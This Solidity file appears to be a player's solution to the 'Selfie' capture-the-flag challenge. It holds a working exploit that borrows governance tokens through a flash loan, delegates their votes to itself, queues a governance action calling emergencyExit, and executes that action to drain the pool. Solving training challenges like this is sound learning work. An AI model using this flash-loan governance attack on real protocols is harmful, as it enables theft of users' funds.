// SPDX-License-Identifier: MIT

pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {SimpleGovernance} from "../../src/selfie/SimpleGovernance.sol";
import {SelfiePool} from "../../src/selfie/SelfiePool.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {IERC3156FlashBorrower} from "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
import {DamnValuableVotes} from "../../src/DamnValuableVotes.sol";

contract AttackSelfie is IERC3156FlashBorrower {

    SelfiePool pool;
    SimpleGovernance governance;
    DamnValuableVotes damnValuableToken;
    uint actionId;

    bytes32 private constant CALLBACK_SUCCESS = keccak256("ERC3156FlashBorrower.onFlashLoan");

    constructor(
        address _selfiePool,
        address _governance,
        address _token
    ) {
        pool = SelfiePool(_selfiePool);
        governance = SimpleGovernance(_governance);
        damnValuableToken = DamnValuableVotes(_token);
    }

    function onFlashLoan(
        address initiator,
        address token,
        uint256 amount,
        uint256 fee,
        bytes calldata data
    ) external returns (bytes32) {

        damnValuableToken.delegate(address(this));

        uint _actionId = governance.queueAction(
            address(pool),
            0,
            data
        );
        actionId = _actionId;

        IERC20(token).approve(address(pool), amount + fee);
        return CALLBACK_SUCCESS;
    }

    function attackSetup(address recovery) external {
        uint amountRequired = 1500000 ether;
        bytes memory data = abi.encodeWithSignature("emergencyExit(address)", recovery);
        
        pool.flashLoan(
            IERC3156FlashBorrower(address(this)),
            address(damnValuableToken),
            amountRequired,
            data
        );
    }

    function attackCloseup() external returns(bool) {
        bytes memory resultData = governance.executeAction(actionId);

        return true;
    }
}